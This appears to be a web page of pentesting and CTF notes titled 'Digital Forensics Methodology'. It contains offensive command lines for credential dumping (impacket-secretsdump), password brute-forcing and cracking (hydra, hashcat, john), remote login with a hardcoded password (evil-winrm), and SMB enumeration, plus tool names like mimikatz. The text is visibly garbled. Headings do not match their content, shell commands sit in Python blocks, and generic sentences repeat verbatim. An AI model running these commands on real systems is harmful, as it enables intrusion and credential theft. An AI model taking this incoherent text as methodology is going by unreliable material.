---
TitleSEO: "Digital Forensics Methodology | ZureFX"
TitlePost: "Digital Forensics Methodology"
Author: "ZureFX"
Description: "Personal notes on Digital Forensics Methodology. Quick reference for pentesting and CTF challenges."
Keywords: "malware, networking, lateral movement"
URL: "https://zurefx.github.io/notes/note-digital-forensics-methodology-325.html"
URL_IMAGES: ""
Date: "2025-09-24"
Tags: "Malware, Networking, Lateral Movement"
Section: "notes"
Lang: "en"
main_img: "note-digital-forensics-methodology-325"
Permalink: "/notes/note-digital-forensics-methodology-325.html"
BtnLabel: "Read Notes"
Pick: 0
---
## Django

### socat

```bash
evil-winrm -i 10.125.173.111 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.36.172.109 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

- `netcat`
- `mimikatz`
- `LXD Privilege Escalation`
- `john`
- `wmiexec`
- `SeImpersonatePrivilege`

## Broken Access Control

### Constrained Delegation

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.85.81.16
evil-winrm -i 10.111.113.61 -u administrator -p 'P@ssw0rd!'
gobuster dir -u http://10.62.140.31/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

```python
impacket-secretsdump administrator:'P@ssw0rd!'@10.26.37.8
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
nmap -sCV -p1433,8443,443 10.102.108.47 -oN scan.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```python
impacket-secretsdump administrator:'P@ssw0rd!'@10.109.253.20
crackmapexec smb 10.23.127.13 -u administrator -p 'P@ssw0rd!' --shares
```

## Local File Inclusion

### PowerShell

> **Note:** Open Redirect was identified as the primary attack vector in this scenario.

Unconstrained delegation was enabled on the compromised machine. Authentication bypass was achieved through careful manipulation of the login mechanism. The service was running without proper input validation, leading to injection vulnerabilities. Authentication bypass was achieved through careful manipulation of the login mechanism. Initial enumeration revealed several interesting open ports on the target.

Command injection was possible through unsanitized user input in the search functionality. Authentication bypass was achieved through careful manipulation of the login mechanism. Initial enumeration revealed several interesting open ports on the target. The scheduled task ran with elevated privileges and could be abused for escalation. Initial enumeration revealed several interesting open ports on the target.

## ligolo-ng

### PHP

> **Note:** SeDebugPrivilege was identified as the primary attack vector in this scenario.

- `lookupsid`
- `dcomexec`
- `chisel`
- `gobuster`

Group Policy Preferences contained encrypted but recoverable credentials. The kernel version was outdated and vulnerable to a publicly known exploit. The scheduled task ran with elevated privileges and could be abused for escalation.

## PostgreSQL

### Python

Weak file permissions allowed modification of critical system files. The target system was identified as running a vulnerable version of the service. The service account had excessive permissions assigned in Active Directory.

The kernel version was outdated and vulnerable to a publicly known exploit. Lateral movement was facilitated by reusing discovered credentials across services. Weak file permissions allowed modification of critical system files. The target system was identified as running a vulnerable version of the service. Weak file permissions allowed modification of critical system files.

The service account had excessive permissions assigned in Active Directory. The web application was vulnerable to Server-Side Template Injection (SSTI).

```python
gobuster dir -u http://10.43.2.245/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
feroxbuster -h
```
